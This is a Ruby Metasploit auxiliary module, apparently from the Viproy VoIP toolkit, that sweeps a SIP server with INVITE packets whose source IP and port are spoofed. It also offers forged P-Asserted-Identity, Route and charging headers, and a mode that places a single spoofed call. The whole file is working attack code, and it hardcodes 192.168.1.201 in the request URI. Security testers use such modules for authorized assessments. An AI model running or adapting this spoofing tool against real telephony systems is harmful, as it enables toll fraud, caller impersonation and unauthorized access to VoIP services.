##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Scanner
        include Msf::Auxiliary::SIP

	def initialize
		super(
			'Name'        => 'SIP Services Trust Analyzer',
			'Version'     => '$Revision$',
			'Description' => 'SIP Services Trust Analyzer',
			'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
			'License'     => MSF_LICENSE
		)

		begin
			require 'pcaprub'
			@@havepcap = true
		rescue ::LoadError
			@@havepcap = false
		end

		deregister_options('FILTER','PCAPFILE','RPORT', 'RHOSTS', 'RPORTS', 'RHOST' )
		register_options(
		[
			OptString.new('SRC_RPORTS', [true, 'Port Range to Perform Trust Sweep', "5060-5065"]),
			OptAddressRange.new('SRC_RHOSTS', [true, 'IP Range to Perform Trust Sweep.']),
			OptAddress.new('SIP_SERVER', [true, 'Target SIP Server']),
			OptString.new('TO',   [ true, "Destination Number at Target SIP Server", "1000"]),
			OptString.new('FROM',   [ false, "Destination Number at Target SIP Server", nil]),
			OptString.new('FROMNAME',   [ false, "Destination Name at Target SIP Server", nil]),
			OptString.new('ACTION',   [ true, "Action for SIP Trust Analysis : SCAN | CALL", "SCAN"]),
			OptInt.new('SIP_PORT',   [true, 'Target Port of The SIP Server',5060]),
		], self.class)

		register_advanced_options(
		[
			OptBool.new('P-Asserted-Identity', [false, 'Spoof for Proxy Identity Field', false]),
			OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
			OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
			OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
			OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
			OptBool.new('DEBUG',   [ false, "Verbose Level", false]),
			OptBool.new('VERBOSE',   [ false, "Verbose Level", false]),
		], self.class)
	end

	def run
		thread_num=datastore['THREADS']
		src_hosts = Rex::Socket::RangeWalker.new(datastore['SRC_RHOSTS'])
		src_ports = Rex::Socket.portspec_crack(datastore['SRC_RPORTS'])
		ip = datastore['SIP_SERVER']
		port = datastore['SIP_PORT']
		to = datastore['TO']
		iplst = []
		begin

			#Building Custom Headers
			customheader = ""
			customheader << datastore['CUSTOMHEADER']+"\r\n" if datastore['CUSTOMHEADER'] != nil
			customheader << "P-Charging-Vector: "+datastore['P-Charging-Vector']+"\r\n" if datastore['P-Charging-Vector'] != nil
			customheader << "Record-Route: "+datastore['Record-Route']+"\r\n" if datastore['Record-Route'] != nil
			customheader << "Route: "+datastore['Route']+"\r\n" if datastore['Route'] != nil	

			if datastore['ACTION'] == 'CALL'
				if datastore['FROM']
					from = datastore['FROM'] 
					fromname = datastore['FROMNAME'] || datastore['FROM'] 
				else
					raise ArgumentError, "FROM must be defined"
				end



				if datastore['P-Asserted-Identity'] == true
					cheader = customheader+"P-Asserted-Identity: #{from}\r\n" 
				else
					cheader = customheader
				end
				src_ip=datastore['SRC_RHOSTS']
				src_port=datastore['SRC_RPORTS'].to_i
				send_request(src_ip,src_port,ip,port,to,from,cheader,fromname)

			else
				numip = src_hosts.num_ips
				while (iplst.length < numip)
					ipa = src_hosts.next_ip
					if (not ipa)
						break
					end
					iplst << ipa
				end
				print_status("Performing Trust sweep for IP range #{datastore['SRC_RHOSTS']}")
				while(not iplst.nil? and not iplst.empty?)
					a = []
					1.upto(thread_num) do
						a << framework.threads.spawn("Module(#{self.refname})", false, iplst.shift) do |src_ip|
							next if src_ip.nil?
							print_status "Sending Spoofed Packets for Source IP : #{src_ip}"


							src_ports.each do |src_port|
								#Setting Spoof Options
								from = datastore['FROM'] || src_ip+":"+src_port.to_s

								if datastore['P-Asserted-Identity'] == true
									cheader = customheader+"P-Asserted-Identity: "+src_ip+":"+src_port.to_s+"\r\n" 
								else
									cheader = customheader
								end
								send_request(src_ip,src_port,ip,port,to,from,cheader)
							end

						end
					end
					a.map {|x| x.join }
				end
				print_good("Spoofed Trust Sweep Completed")
			end

		rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
		rescue ::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end
	def send_request(src_ip,src_port,ip,port,to,from,cheader,fromname=nil)
		#Assembling Packet
		open_pcap
		p = PacketFu::UDPPacket.new
		p.ip_saddr = src_ip
		p.ip_daddr = ip 
		p.ip_ttl = 255
		p.udp_sport = src_port
		p.udp_dport = port
		p.payload=prep_invite(src_ip,src_port,ip,port,to,from,cheader,fromname)
		p.recalc

		#Sending Packet
		ret = send(ip,p)
		if ret == :done
			vprint_status("#{src_ip}: Sent a packet to #{ip} from #{src_port}")
		else
			print_error("#{src_ip}: Packet not sent for port #{src_port} ")
		end
		close_pcap

	end
	def prep_invite(src_addr,src_port,ip,port,to,from,cheader,fromname=nil)
		fromname="#{src_addr}:#{src_port}" if fromname.nil?

		#Preparing Request
		data =  "INVITE sip:#{to}@192.168.1.201 SIP/2.0\r\n"
		data += "Via: SIP/2.0/UDP #{src_addr}:#{src_port};branch=branch#{Rex::Text.rand_text_alphanumeric(10)};rport\r\n"
		data += "Max-Forwards: 70\r\n"
		data += "From: \"#{fromname}\" <sip:#{from}@#{src_addr}>;tag=tag#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
		data += "To: <sip:#{to}@192.168.1.201>\r\n"
		data += "Contact: <sip:#{from}@#{src_addr}>\r\n"
		data += "Call-ID: call#{Rex::Text.rand_text_alphanumeric(10)}@#{src_addr}\r\n"
		data += "CSeq: 1 INVITE\r\n"
		data += "User-Agent: Test Agent\r\n"
		#data += "Date: Tue, 26 Mar 2013 12:37:54 GMT\r\n"
		data += "Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO\r\n"
		data += "Supported: replaces, timer\r\n"
		data += cheader 
		data += "Content-Type: application/sdp\r\n"

		idata = "v=0\r\n"
		idata += "o=root 1716603896 1716603896 IN IP4 #{src_addr}\r\n"
		idata += "s=Test Source\r\n"
		idata += "c=IN IP4 #{src_addr}\r\n"
		idata += "t=0 0\r\n"
		idata += "m=audio 10024 RTP/AVP 0 101\r\n"
		idata += "a=rtpmap:0 PCMU/8000\r\n"
		idata += "a=rtpmap:101 telephone-event/8000\r\n"
		idata += "a=fmtp:101 0-16\r\n"
		idata += "a=ptime:20\r\n"
		idata += "a=sendrec\r\n"

		data += "Content-Length: #{idata.length}\r\n\r\n#{idata}"		

	end

	def send(ip,pkt)
		begin
			capture_sendto(pkt, ip)
		rescue RuntimeError => e
			return :error
		end
		return :done
	end


end
